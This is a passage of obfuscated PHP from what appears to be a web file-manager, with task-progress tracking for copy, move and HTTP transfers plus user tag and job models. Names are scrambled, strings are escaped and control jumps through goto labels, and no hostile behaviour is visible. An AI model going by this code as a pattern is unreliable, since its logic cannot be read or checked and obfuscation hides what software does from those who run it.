Hook::bind($Ø¡Á[612], array($this, $Ø¡Á[1684])); Hook::bind($Ø¡Á[613], array($this, $Ø¡Á[1685])); Hook::bind($Ø¡Á[618], array($this, $Ø¡Á[1686])); Hook::bind($Ø¡Á[619], array($this, $Ø¡Á[1687])); Hook::bind($Ø¡Á[615], array($this, $Ø¡Á[1688])); Hook::bind($Ø¡Á[616], array($this, $Ø¡Á[1689])); Hook::bind($Ø¡Á[582], array($this, $Ø¡Á[1690])); Hook::bind($Ø¡Á[579], array($this, $Ø¡Á[1690])); Hook::bind($Ø¡Á[584], array($this, $Ø¡Á[1690])); Hook::bind($Ø¡Á[586], array($this, $Ø¡Á[1690])); Hook::bind($Ø¡Á[588], array($this, $Ø¡Á[1690])); Hook::bind($Ø¡Á[1691], array($this, $Ø¡Á[1692])); Hook::bind($Ø¡Á[605], array($this, $Ø¡Á[1693])); $this->sourceModelCopyFlag = !1; Hook::bind($Ø¡Á[1694], array($this, $Ø¡Á[1695])); Hook::bind($Ø¡Á[1696], array($this, $Ø¡Á[1697])); Hook::bind($Ø¡Á[1698], array($this, $Ø¡Á[1699])); $ŸÉİàç©[$Ø¡Á[1700]] = LNG($Ø¡Á[1701]); $ŸÉİàç©[$Ø¡Á[1702]] = 0; $ŸÉİàç©[$Ø¡Á[1703]] = 0; $ŸÉİàç©[$Ø¡Á[1058]] = $Ø¡Á[12]; $ŸÉİàç©[$Ø¡Á[1704]] = $Ø¡Á[12]; $ŸÉİàç©[$Ø¡Á[1705]] = 0; $ŸÉİàç©[$Ø¡Á[1706]] = 0; $ŸÉİàç©[$Ø¡Á[1707]] = 0; if (!$ŸÉİàç©[$Ø¡Á[1550]]) { $ŸÉİàç©[$Ø¡Á[1550]] = LNG($Ø¡Á[1708]); } } protected function endAfter() { $¨æÉÃ¥è =& $_SERVER[¤·²È‰º]; Hook::unbind($¨æÉÃ¥è[1679], array($this, $¨æÉÃ¥è[1680])); Hook::unbind($¨æÉÃ¥è[1209], array($this, $¨æÉÃ¥è[1681])); Hook::unbind($¨æÉÃ¥è[1682], array($this, $¨æÉÃ¥è[1683])); Hook::unbind($¨æÉÃ¥è[612], array($this, $¨æÉÃ¥è[1684])); Hook::unbind($¨æÉÃ¥è[613], array($this, $¨æÉÃ¥è[1685])); Hook::unbind($¨æÉÃ¥è[618], array($this, $¨æÉÃ¥è[1686])); Hook::unbind($¨æÉÃ¥è[619], array($this, $¨æÉÃ¥è[1687])); Hook::unbind($¨æÉÃ¥è[615], array($this, $¨æÉÃ¥è[1688])); Hook::unbind($¨æÉÃ¥è[616], array($this, $¨æÉÃ¥è[1689])); Hook::unbind($¨æÉÃ¥è[582], array($this, $¨æÉÃ¥è[1690])); Hook::unbind($¨æÉÃ¥è[579], array($this, $¨æÉÃ¥è[1690])); Hook::unbind($¨æÉÃ¥è[584], array($this, $¨æÉÃ¥è[1690])); Hook::unbind($¨æÉÃ¥è[586], array($this, $¨æÉÃ¥è[1690])); Hook::unbind($¨æÉÃ¥è[588], array($this, $¨æÉÃ¥è[1690])); Hook::unbind($¨æÉÃ¥è[1691], array($this, $¨æÉÃ¥è[1692])); Hook::unbind($¨æÉÃ¥è[605], array($this, $¨æÉÃ¥è[1693])); Hook::unbind($¨æÉÃ¥è[1694], array($this, $¨æÉÃ¥è[1695])); Hook::unbind($¨æÉÃ¥è[1696], array($this, $¨æÉÃ¥è[1697])); Hook::unbind($¨æÉÃ¥è[1698], array($this, $¨æÉÃ¥è[1699])); } public function copyMoveStart($×¨·‘½Ø, $ÌÛÌ°Ù», $¯èËºª, $¡Á‘Ó”Ù) { $©áæûäğ =& $_SERVER[¤·²È‰º]; self::log($©áæûäğ[1709] . $ÌÛÌ°Ù» . $©áæûäğ[80] . $¡Á‘Ó”Ù); $äÔ…¿ = rtrim(TEMP_FILES, $©áæûäğ[8]); if (substr($ÌÛÌ°Ù», 0, strlen($äÔ…¿)) == $äÔ…¿) { return; } if (substr($¡Á‘Ó”Ù, 0, strlen($äÔ…¿)) == $äÔ…¿) { return; } $½´‹¬şŒ =& $this->task; $½´‹¬şŒ[$©áæûäğ[1710]] = KodIO::transferType($×¨·‘½Ø, $¯èËºª); $this->update(); } public function updateAfter() { $·Ÿ£·‡ =& $_SERVER[¤·²È‰º]; $ø“©û¯¨ =& $this->task; if (!$ø“©û¯¨[$·Ÿ£·‡[764]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ø“©û¯¨[$·Ÿ£·‡[1710]] == $·Ÿ£·‡[1298]) { return; } self::updateTask($ø“©û¯¨); } private static function updateTask(&$È‡ŒºÇå) { $«íÙíù´ =& $_SERVER[¤·²È‰º]; if ($È‡ŒºÇå[$«íÙíù´[1710]] == $«íÙíù´[1193] || $È‡ŒºÇå[$«íÙíù´[1710]] == $«íÙíù´[117]) { if ($È‡ŒºÇå[$«íÙíù´[1704]]) { $È‡ŒºÇå[$«íÙíù´[1707]] = $È‡ŒºÇå[$«íÙíù´[1706]] + $È‡ŒºÇå[$«íÙíù´[1703]]; } } else { if ($È‡ŒºÇå[$«íÙíù´[1710]] == $«íÙíù´[1299]) { if ($È‡ŒºÇå[$«íÙíù´[1704]] == $«íÙíù´[1193]) { $È‡ŒºÇå[$«íÙíù´[1707]] = $È‡ŒºÇå[$«íÙíù´[1706]] + $È‡ŒºÇå[$«íÙíù´[1703]] * 0.5; } else { if ($È‡ŒºÇå[$«íÙíù´[1704]] == $«íÙíù´[117]) { $È‡ŒºÇå[$«íÙíù´[1707]] = $È‡ŒºÇå[$«íÙíù´[1706]] + $È‡ŒºÇå[$«íÙíù´[1702]] * 0.5 + $È‡ŒºÇå[$«íÙíù´[1703]] * 0.5; } } } } $È‡ŒºÇå[$«íÙíù´[1653]] = $È‡ŒºÇå[$«íÙíù´[1707]] / $È‡ŒºÇå[$«íÙíù´[764]]; if ($È‡ŒºÇå[$«íÙíù´[1653]] > 0) { $“ ¿Ã¦¯ = timeFloat() - $È‡ŒºÇå[$«íÙíù´[1655]] - $È‡ŒºÇå[$«íÙíù´[1658]]; $È‡ŒºÇå[$«íÙíù´[1659]] = $“ ¿Ã¦¯ * (1 - $È‡ŒºÇå[$«íÙíù´[1653]]) / $È‡ŒºÇå[$«íÙíù´[1653]]; } } public function addPath($¿­«ŒŸÓ) { $ŒÆ‹¥ø© =& $_SERVER[¤·²È‰º]; if (!$¿­«ŒŸÓ) { return; } $±¶ª¢Õ =& $this->task; $°±Ş³ËÑ = IO::infoWithChildren($¿­«ŒŸÓ); $…¨„Ñ¶Ê = $±¶ª¢Õ[$ŒÆ‹¥ø©[1711]] ? $±¶ª¢Õ[$ŒÆ‹¥ø©[1711]][$ŒÆ‹¥ø©[1712]] : 0; $±¶ª¢Õ[$ŒÆ‹¥ø©[1711]] = array($ŒÆ‹¥ø©[1712] => $…¨„Ñ¶Ê + 1, $ŒÆ‹¥ø©[428] => $°±Ş³ËÑ[$ŒÆ‹¥ø©[42]], $ŒÆ‹¥ø©[94] => $°±Ş³ËÑ[$ŒÆ‹¥ø©[94]], $ŒÆ‹¥ø©[527] => $°±Ş³ËÑ[$ŒÆ‹¥ø©[527]] ? $°±Ş³ËÑ[$ŒÆ‹¥ø©[527]] : $°±Ş³ËÑ[$ŒÆ‹¥ø©[94]]); if ($°±Ş³ËÑ[$ŒÆ‹¥ø©[43]] == $ŒÆ‹¥ø©[209]) { $±¶ª¢Õ[$ŒÆ‹¥ø©[787]] += 1; } else { $±¶ª¢Õ[$ŒÆ‹¥ø©[787]] += $°±Ş³ËÑ[$ŒÆ‹¥ø©[89]][$ŒÆ‹¥ø©[87]]; if ($°±Ş³ËÑ[$ŒÆ‹¥ø©[410]]) { $±¶ª¢Õ[$ŒÆ‹¥ø©[787]] += $°±Ş³ËÑ[$ŒÆ‹¥ø©[89]][$ŒÆ‹¥ø©[88]] + 1; } } $±¶ª¢Õ[$ŒÆ‹¥ø©[764]] += $°±Ş³ËÑ[$ŒÆ‹¥ø©[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($îœãîÉŞ) { } public function sourceAddHashEnd($’¶ÈòßÙ) { } public function sourceAddFileStart($èËû·£”) { $ÆüÔ¬İ =& $_SERVER[¤·²È‰º]; $¼ÊÌçâº =& $this->task; $¼ÊÌçâº[$ÆüÔ¬İ[1702]] = $èËû·£”[$ÆüÔ¬İ[86]]; $¼ÊÌçâº[$ÆüÔ¬İ[1700]] = $èËû·£”[$ÆüÔ¬İ[42]]; $¼ÊÌçâº[$ÆüÔ¬İ[1058]] = $èËû·£”[$ÆüÔ¬İ[42]]; $¼ÊÌçâº[$ÆüÔ¬İ[1713]] = $èËû·£”[$ÆüÔ¬İ[94]]; $this->update(); } public function sourceAddFileEnd($åË¤Õº®) { $ ×©ÈÅ­ =& $_SERVER[¤·²È‰º]; $µ´¢óö =& $this->task; $µ´¢óö[$ ×©ÈÅ­[1707]] += $åË¤Õº®[$ ×©ÈÅ­[86]]; $µ´¢óö[$ ×©ÈÅ­[1713]] = $åË¤Õº®[$ ×©ÈÅ­[94]]; $this->update(1); } public function copyFileStart($Í¤´³£™, $¼”ÆÄ½, $ÁÄç÷î¯, $µÌğ–¼, $Êíóà‚©, $±Şò–áš) { $òƒï‹ùÂ =& $_SERVER[¤·²È‰º]; $èÚÊíì = $Êíóà‚©; if ($èÚÊíì == $GLOBALS[$òƒï‹ùÂ[1714]]) { $èÚÊíì = $GLOBALS[$òƒï‹ùÂ[1715]]; } $GLOBALS[$òƒï‹ùÂ[1715]] = $Êíóà‚©; $GLOBALS[$òƒï‹ùÂ[1714]] = $±Şò–áš; $Ü““¼·» =& $this->task; $Ü““¼·»[$òƒï‹ùÂ[1700]] = $èÚÊíì; $Ü““¼·»[$òƒï‹ùÂ[1702]] = (int) $Í¤´³£™->size($¼”ÆÄ½); $Ü““¼·»[$òƒï‹ùÂ[1703]] = 0; $Ü““¼·»[$òƒï‹ùÂ[1058]] = $òƒï‹ùÂ[12]; $Ü““¼·»[$òƒï‹ùÂ[1704]] = $òƒï‹ùÂ[12]; $Ü““¼·»[$òƒï‹ùÂ[1705]] = 0; $´øíºä¤ = $Ü““¼·»[$òƒï‹ùÂ[1702]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ü““¼·»[$òƒï‹ùÂ[407]] . $òƒï‹ùÂ[1716]); if ($´øíºä¤ && file_exists(get_path_father($µÌğ–¼))) { Cache::set($Ü““¼·»[$òƒï‹ùÂ[407]] . $òƒï‹ùÂ[1716], $µÌğ–¼); $Ü““¼·»[$òƒï‹ùÂ[1673]] = array($òƒï‹ùÂ[1717], $òƒï‹ùÂ[1718]); } $this->update(0, $´øíºä¤); } public static function updateCopyLocalFileSize($ĞìêÕ°­) { $ûÇ÷´ÈÇ =& $_SERVER[¤·²È‰º]; $Š˜ĞÕú = Cache::get($ĞìêÕ°­[$ûÇ÷´ÈÇ[407]] . $ûÇ÷´ÈÇ[1716]); if (!$Š˜ĞÕú || !file_exists($Š˜ĞÕú)) { return $ĞìêÕ°­; } $ĞìêÕ°­[$ûÇ÷´ÈÇ[1703]] = @filesize($Š˜ĞÕú); $ĞìêÕ°­[$ûÇ÷´ÈÇ[1707]] += $ĞìêÕ°­[$ûÇ÷´ÈÇ[1703]]; self::updateTask($ĞìêÕ°­); return $ĞìêÕ°­; } public function copyFileEnd($¤×·›¢™, $õÛáæŒ, $€ïŸÈÒ , $Âòò¯ĞÁ, $ŠİÀ­”, $‹Õ©Ã±Ö) { $«Âßòëè =& $_SERVER[¤·²È‰º]; $ó‹€Ù§ñ =& $this->task; $ó‹€Ù§ñ[$«Âßòëè[1703]] = $ó‹€Ù§ñ[$«Âßòëè[1702]]; $ó‹€Ù§ñ[$«Âßòëè[1704]] = $«Âßòëè[12]; unset($ó‹€Ù§ñ[$«Âßòëè[1673]]); if ($ŠİÀ­” == $ó‹€Ù§ñ[$«Âßòëè[1700]]) { $ó‹€Ù§ñ[$«Âßòëè[1706]] += $ó‹€Ù§ñ[$«Âßòëè[1702]]; $ó‹€Ù§ñ[$«Âßòëè[1707]] = $ó‹€Ù§ñ[$«Âßòëè[1706]]; $§ÄÖæ’— = 1; if (isset($ó‹€Ù§ñ[$«Âßòëè[1713]]) && $ó‹€Ù§ñ[$«Âßòëè[1713]] == $õÛáæŒ) { $§ÄÖæ’— = 0; } $this->update($§ÄÖæ’—); } else { $this->update(); $ó‹€Ù§ñ[$«Âßòëè[1703]] = 0; } Cache::remove($ó‹€Ù§ñ[$«Âßòëè[407]] . $«Âßòëè[1716]); self::log($«Âßòëè[1719] . $õÛáæŒ . $«Âßòëè[80] . $Âòò¯ĞÁ . $«Âßòëè[18] . $ŠİÀ­” . $«Âßòëè[1720] . $ó‹€Ù§ñ[$«Âßòëè[1700]]); } public function updateFileEnd($åûœ“äª, $ÎÊôšÛó) { $ÑÈÌÀ® =& $_SERVER[¤·²È‰º]; $ÍŒÂŸ¹Ù =& $this->task; $ÍŒÂŸ¹Ù[$ÑÈÌÀ®[1700]] = $åûœ“äª; $ÍŒÂŸ¹Ù[$ÑÈÌÀ®[1702]] = $ÎÊôšÛó; $ÍŒÂŸ¹Ù[$ÑÈÌÀ®[1706]] += $ÎÊôšÛó; $ÍŒÂŸ¹Ù[$ÑÈÌÀ®[1707]] = $ÍŒÂŸ¹Ù[$ÑÈÌÀ®[1706]]; $this->update(1); self::log($ÑÈÌÀ®[1721] . $åûœ“äª); } public function sourceModelCopy($¤¦¹Œñ‚) { $›áÄ©¡¥ =& $_SERVER[¤·²È‰º]; $’§‹¾Éò = $¤¦¹Œñ‚[0]; $³›Á€Ê = $¤¦¹Œñ‚[1]; $¶¤„«Ü¤ =& $this->task; $this->sourceModelCopyFlag = !0; $¿¡ÄÔç× = 0; switch ($’§‹¾Éò) { case $›áÄ©¡¥[580]: $¿¡ÄÔç× = 1; break; case $›áÄ©¡¥[583]: $¶¤„«Ü¤[$›áÄ©¡¥[1700]] = $³›Á€Ê[$›áÄ©¡¥[42]]; break; case $›áÄ©¡¥[585]: $¿¡ÄÔç× = intval($¤¦¹Œñ‚[$›áÄ©¡¥[388]] * 0.4); break; case $›áÄ©¡¥[587]: $¿¡ÄÔç× = intval($¤¦¹Œñ‚[$›áÄ©¡¥[388]] * 0.2); break; case $›áÄ©¡¥[589]: $¿¡ÄÔç× = intval($¤¦¹Œñ‚[$›áÄ©¡¥[388]] * 0.4); break; } $this->update($¿¡ÄÔç×); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ê³îËé‚, $ªàÒ †‰) { $Á‚¶ §™ =& $_SERVER[¤·²È‰º]; $this->sourceModelCopyFlag = !0; $›·ˆ”úÕ = 1; if (isset($Ê³îËé‚[$Á‚¶ §™[89]])) { $›·ˆ”úÕ = $Ê³îËé‚[$Á‚¶ §™[89]][$Á‚¶ §™[87]]; $›·ˆ”úÕ = $›·ˆ”úÕ + $Ê³îËé‚[$Á‚¶ §™[89]][$Á‚¶ §™[88]] + 1; } $this->update($›·ˆ”úÕ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ë ¢ç†¢) { $this->sourceRemove($Ë ¢ç†¢, !1); } public function curlProgress($ÑÆë¼ÌÆ, $™º¸÷¶¤, $Ë´¨ë“, $–üÏöĞé, $Ôƒèƒ¼€) { $ö¥ò£—› =& $_SERVER[¤·²È‰º]; $¦»€ÖŸ¥ =& $this->task; if ($Ôƒèƒ¼€ > 0) { $¦»€ÖŸ¥[$ö¥ò£—›[1058]] = $ö¥ò£—›[1722]; $¦»€ÖŸ¥[$ö¥ò£—›[1704]] = $ö¥ò£—›[117]; if ($¦»€ÖŸ¥[$ö¥ò£—›[1702]]) { $¦»€ÖŸ¥[$ö¥ò£—›[1703]] = $Ôƒèƒ¼€; } if ($¦»€ÖŸ¥[$ö¥ò£—›[1705]]) { $¦»€ÖŸ¥[$ö¥ò£—›[1703]] = $Ôƒèƒ¼€ + $¦»€ÖŸ¥[$ö¥ò£—›[1705]]; } } else { if ($Ë´¨ë“ > 0) { if ($¦»€ÖŸ¥[$ö¥ò£—›[1702]] == $™º¸÷¶¤) { $¦»€ÖŸ¥[$ö¥ò£—›[1703]] = $Ë´¨ë“; $¦»€ÖŸ¥[$ö¥ò£—›[1058]] = $ö¥ò£—›[1723]; $¦»€ÖŸ¥[$ö¥ò£—›[1704]] = $ö¥ò£—›[1193]; } } } $this->update(); } public function curlProgressStart($îÙÒÆ®) { } public function curlProgressEnd($–÷úÉ) { $ Üøéõ° =& $_SERVER[¤·²È‰º]; $•á›ùŒ› =& $this->task; $ˆÊ‹«›È = curl_getinfo($–÷úÉ); $İÒÍûûê = $ˆÊ‹«›È[$ Üøéõ°[1724]]; if ($İÒÍûûê == -1) { $İÒÍûûê = $ˆÊ‹«›È[$ Üøéõ°[1725]]; } if ($•á›ùŒ›[$ Üøéõ°[1704]] == $ Üøéõ°[117] && $İÒÍûûê) { $•á›ùŒ›[$ Üøéõ°[1705]] += $İÒÍûûê; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $–’Ûâ¨» =& $_SERVER[¤·²È‰º]; $şƒ‘ŠÇ =& $this->task; $şƒ‘ŠÇ[$–’Ûâ¨»[1726]] = 1; Hook::bind($–’Ûâ¨»[1694], array($this, $–’Ûâ¨»[1727])); Hook::bind($–’Ûâ¨»[1696], array($this, $–’Ûâ¨»[1728])); Hook::bind($–’Ûâ¨»[1698], array($this, $–’Ûâ¨»[1729])); } protected function endAfter() { $ù÷Ñ“Ù² =& $_SERVER[¤·²È‰º]; Hook::unbind($ù÷Ñ“Ù²[1694], array($this, $ù÷Ñ“Ù²[1727])); Hook::unbind($ù÷Ñ“Ù²[1696], array($this, $ù÷Ñ“Ù²[1728])); Hook::unbind($ù÷Ñ“Ù²[1698], array($this, $ù÷Ñ“Ù²[1729])); } public function progressStart($·‰ì×­«) { $ÇÉÁîœ† =& $_SERVER[¤·²È‰º]; $ªçğ€¸ = curl_getinfo($·‰ì×­«); self::log($ÇÉÁîœ†[1730] . $ªçğ€¸[$ÇÉÁîœ†[316]]); self::valueSet($this->task[$ÇÉÁîœ†[407]], $this->task); } public function progressEnd($Ÿà¿İ·) { $Ğ÷ÊöŸà =& $_SERVER[¤·²È‰º]; self::log($Ğ÷ÊöŸà[1731] . $this->task[$Ğ÷ÊöŸà[407]]); $this->end(); } public function progress($â°ëƒ³Á, $¼«ñ–•ß, $ÓûÅ‰¾„, $®¸×³°ã, $ßûÃ İ) { $ÆØ”ÄÜÃ =& $_SERVER[¤·²È‰º]; $¥¸âíç© =& $this->task; if ($ßûÃ İ > 0) { $¥¸âíç©[$ÆØ”ÄÜÃ[787]] = $¥¸âíç©[$ÆØ”ÄÜÃ[787]] == 0 ? $®¸×³°ã : $¥¸âíç©[$ÆØ”ÄÜÃ[787]]; $¥¸âíç©[$ÆØ”ÄÜÃ[1652]] = $ßûÃ İ; } else { if ($ÓûÅ‰¾„ > 0) { $¥¸âíç©[$ÆØ”ÄÜÃ[787]] = $¥¸âíç©[$ÆØ”ÄÜÃ[787]] == 0 ? $¼«ñ–•ß : $¥¸âíç©[$ÆØ”ÄÜÃ[787]]; $¥¸âíç©[$ÆØ”ÄÜÃ[1652]] = $ÓûÅ‰¾„; } } $this->update(); self::log("\160\162\x6f\147\x72\145\163\163\x48\x74\164\160\72\x64\157\167\156\x3a{$ÓûÅ‰¾„}\57{$¼«ñ–•ß}\73\x20\x75\x70\154\157\141\144\72{$ßûÃ İ}\57{$®¸×³°ã}\x3b"); } } goto eè°êˆ«¡¸; Eİ‰á‰Õ: function binCheckBigger($êšğçİõ, $¡öËûŸ¨) { return $êšğçİõ > $¡öËûŸ¨; } $_SERVER[$_SERVER[ŠË¥ÌáÛ][3]] = ("\70\60\67\71".base64_decode('MDU='))+0;$_rhts="8tbpzdif5qr6w2us419ylajexg07mhn3cvokeu05cxyk6nda3obihmrlg2pw1z97jvsq8";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($™È ÛâÅ, $ó€Ã¨ú) { $Ê‰ó‡óà =& $_SERVER[¤·²È‰º]; if (isset(self::$_methodList[$™È ÛâÅ])) { return @call_user_func_array(self::$_methodList[$™È ÛâÅ], $ó€Ã¨ú); } else { if (method_exists($this, $™È ÛâÅ)) { return call_user_func_array(array($this, $™È ÛâÅ), $ó€Ã¨ú); } else { think_exception(__CLASS__ . $Ê‰ó‡óà[4] . $™È ÛâÅ . $Ê‰ó‡óà[5]); } } } public static function __callStatic($”Ç¢òµ×, $ãÂù ›) { if (isset(self::$_methodListStatic[$”Ç¢òµ×])) { return call_user_func_array(self::$_methodListStatic[$”Ç¢òµ×], $ãÂù ›); } else { if (method_exists(self, $”Ç¢òµ×)) { return call_user_func_array(array(self, $”Ç¢òµ×), $ãÂù ›); } else { show_json("{$”Ç¢òµ×}\50\x29\40\156\157\164\40\145\170\151\163\x74\73", !1); } } } public static function addMethod($µÂÂßŸå, $æí€Õ) { self::$_methodList[$µÂÂßŸå] = $æí€Õ; } public static function addMethodStatic($±Í¸¬¿ª, $Ó°ÀÜõ„) { self::$_methodListStatic[$±Í¸¬¿ª] = $Ó°ÀÜõ„; } } goto aĞ‘¸Ñ¼â; c«ÀŠÀ˜’Ã: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\164\141\x67\114\x69\163\x74"; public $modelType = "\x55\163\x65\x72\117\160\164\151\157\x6e"; public $field = array("\156\141\155\145", "\x73\164\171\154\x65", "\163\157\x72\x74"); public function listData($ÓÎÄ­õæ = false, $ÇæÛÁËÜ = "\163\x6f\x72\x74", $’£ì£¡“ = false) { return parent::listData($ÓÎÄ­õæ, $ÇæÛÁËÜ, $’£ì£¡“); } public function remove($ß³¼Æš–) { return parent::remove($ß³¼Æš–); } public function add($…ìƒ÷˜, $õ¢ÕÅ¾È = "\x6c\x61\x62\x65\154\x2d\x67\x72\x65\171\55\156\x6f\162\x6d\141\x6c") { $ºñÊß°ì =& $_SERVER[¤·²È‰º]; if ($this->findByName($…ìƒ÷˜)) { return !1; } $¶‚â½Ê = array($ºñÊß°ì[428] => $…ìƒ÷˜, $ºñÊß°ì[493] => $õ¢ÕÅ¾È, $ºñÊß°ì[1827] => $this->getSort($ºñÊß°ì[267]) + 1); return parent::insert($¶‚â½Ê); } public function update($”³²¥õ‰, $ì¿äçŸ) { $İ¶èÅû =& $_SERVER[¤·²È‰º]; $„™ç±Ğ¶ = $this->listData($”³²¥õ‰); $¨Èíøà = $this->findByName($ì¿äçŸ[$İ¶èÅû[42]]); if (!$„™ç±Ğ¶ || $¨Èíøà && $¨Èíøà[$İ¶èÅû[407]] != $„™ç±Ğ¶[$İ¶èÅû[407]]) { return !1; } return parent::update($”³²¥õ‰, $ì¿äçŸ); } public function moveTop($¯©ª¦¤Ù) { $€¤Ÿ¸„ =& $_SERVER[¤·²È‰º]; $»„—ŠÍÂ = parent::listData(); $°üãğ‘ë = $this->getSort($€¤Ÿ¸„[266]); foreach ($»„—ŠÍÂ as &$ÍÔàã©) { if ($ÍÔàã©[$€¤Ÿ¸„[407]] == $¯©ª¦¤Ù) { $ÍÔàã©[$€¤Ÿ¸„[1847]] = $°üãğ‘ë; continue; } $ÍÔàã©[$€¤Ÿ¸„[1847]] += 1; } unset($ÍÔàã©); return parent::resetData($»„—ŠÍÂ); } public function moveBottom($ºÎÈúàÒ) { $û•ŠŸß¥ =& $_SERVER[¤·²È‰º]; $…¥±Ø– = $this->getSort($û•ŠŸß¥[267]) + 1; return parent::update($ºÎÈúàÒ, array($û•ŠŸß¥[1847] => $…¥±Ø–)); } public function resetSort($ÚÏß„©) { $ŞµÑ¸»­ =& $_SERVER[¤·²È‰º]; $´Ø†àÁÄ = array(); $ÚÏß„© = is_array($ÚÏß„©) ? $ÚÏß„© : array(); for ($ßˆÌÉñê = 0; $ßˆÌÉñê < count($ÚÏß„©); $ßˆÌÉñê++) { $´Ø†àÁÄ[$ÚÏß„©[$ßˆÌÉñê] . $ŞµÑ¸»­[12]] = $ßˆÌÉñê + 1; } $”ÜÓ = parent::listData(); foreach ($”ÜÓ as &$ıüÚ×‡) { $ñÓµÛ§ = $´Ø†àÁÄ[$ıüÚ×‡[$ŞµÑ¸»­[407]]]; $ıüÚ×‡[$ŞµÑ¸»­[1847]] = $ñÓµÛ§ ? $ñÓµÛ§ : $ıüÚ×‡[$ŞµÑ¸»­[1847]]; } unset($ıüÚ×‡); return parent::resetData($”ÜÓ); } private function getSort($ÊÚ‚Ç…£) { $ìçÊÛù =& $_SERVER[¤·²È‰º]; $ìœ™‘ = parent::listData(); $»ÅÄ…‹ = array_to_keyvalue($ìœ™‘, $ìçÊÛù[12], $ìçÊÛù[1847]); if (!$»ÅÄ…‹) { $»ÅÄ…‹ = array(0); } $Á‡¢ê… = $ÊÚ‚Ç…£ == $ìçÊÛù[267] ? max($»ÅÄ…‹) : min($»ÅÄ…‹); return intval($Á‡¢ê…); } } goto aá²‰èŞÅ‡; b½®ª­ÈŒÙ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\152\x6f\x62\114\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x64\x65\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\x65\x6c\146\x4a\x6f\142\114\x69\x73\x74"; public function listData($İ¡‚û¹ = false, $ö×‘×Õ¿ = "\x73\x6f\162\x74", $„‚¡ ±‚ = false) { return parent::listData($İ¡‚û¹, $ö×‘×Õ¿, $„‚¡ ±‚); } public function remove($Ö¶åšØ) { return parent::remove($Ö¶åšØ); } public function add($’½ÚŒèÂ) { $â‘ğ„Î÷ =& $_SERVER[¤·²È‰º]; if ($this->findByName($’½ÚŒèÂ[$â‘ğ„Î÷[42]])) { return !1; } $’½ÚŒèÂ[$â‘ğ„Î÷[1847]] = $this->getSort(); return parent::insert($’½ÚŒèÂ); } private function getSort() { $ªƒÃˆûï =& $_SERVER[¤·²È‰º]; $­†öùû‡ = parent::listData(); $ä˜Î•¿Õ = array_to_keyvalue($­†öùû‡, $ªƒÃˆûï[12], $ªƒÃˆûï[1847]); return empty($ä˜Î•¿Õ) ? 0 : max($ä˜Î•¿Õ) + 1; } public function update($‘‚ØıèÂ, $ÏÃıäå) { $´“†¨Ğ¡ =& $_SERVER[¤·²È‰º]; $®şôÔ×ü = parent::listData($‘‚ØıèÂ); $ÏÍ÷‚¦ = $this->findByName($ÏÃıäå[$´“†¨Ğ¡[42]]); if (!$®şôÔ×ü || $ÏÍ÷‚¦ && $ÏÍ÷‚¦[$´“†¨Ğ¡[407]] != $®şôÔ×ü[$´“†¨Ğ¡[407]]) { return !1; } return parent::update($‘‚ØıèÂ, $ÏÃıäå); } public function setUserJob($ƒçîÜ»º, $ãœ¡Èë«) { $Ü¦ŒÕ× =& $_SERVER[¤·²È‰º]; if (!is_array($ãœ¡Èë«)) { $ãœ¡Èë« = array($ãœ¡Èë«); } $¡Ò¾–¹¸ = parent::listData(); $¯È•†‘ = array_to_keyvalue($¡Ò¾–¹¸, $Ü¦ŒÕ×[42]); $ÑºíÒßø = $Ü¦ŒÕ×[22]; foreach ($ãœ¡Èë« as $¸ıÀ°úÆ) { if ($¯È•†‘[$¸ıÀ°úÆ]) { $ÑºíÒßø .= $¯È•†‘[$¸ıÀ°úÆ][$Ü¦ŒÕ×[407]] . $Ü¦ŒÕ×[60]; } else { $ÅóÌåŒ = $this->add($¸ıÀ°úÆ); $ÑºíÒßø .= $ÅóÌåŒ . $Ü¦ŒÕ×[60]; } } $ÑºíÒßø = rtrim($ÑºíÒßø, $Ü¦ŒÕ×[60]); Model($Ü¦ŒÕ×[543])->metaSet($ƒçîÜ»º, self::JOB_KEY, $ÑºíÒßø); } public function getUserJob($Ìß¼„¥Æ) { $Ûóí™×… = Model($_SERVER[¤·²È‰º][543])->metaGet($Ìß¼„¥Æ); return $this->getUserJobInfo($Ûóí™×…[self::JOB_KEY]); } public function getUserJobInfo($€¶¢Šì) { $æ¨àª¡Ú =& $_SERVER[¤·²È‰º]; $èÁĞèùÂ = explode($æ¨àª¡Ú[60], $€¶¢Šì); $‹™Ò¬‰ = parent::listData(); $‹™Ò¬‰ = array_remove_key($‹™Ò¬‰, $æ¨àª¡Ú[210]); $Ô°Ò‡ = array(); foreach ($èÁĞèùÂ as $ÛƒÇÛí) { if (isset($‹™Ò¬‰[$ÛƒÇÛí])) { $Ô°Ò‡[] = $‹™Ò¬‰[$ÛƒÇÛí]; } } return $Ô°Ò‡; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\x6d\x65" => "\165\163\145\162\x5f\155\145\164\x61", "\x6d\145\x74\x61\x46\151\x65\x6c\144" => "\x75\x73\145\162\x49\x44"); protected $simpleField = "\165\163\145\162\x49\x44\54\x6e\x69\x63\x6b\116\141\x6d\x65\54\x6e\141\x6d\145\54\141\x76\141\x74\141\162\x2c\163\145\170\x2c\163\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‘¥¼Ö¯) { $¼­Ö×à =& $_SERVER[¤·²È‰º]; $¿°÷ÆŸ” = $¼­Ö×à[2269]; return array($¼­Ö×à[1901] => array($‘¥¼Ö¯[0], $¿°÷ÆŸ”), $¼­Ö×à[1903] => 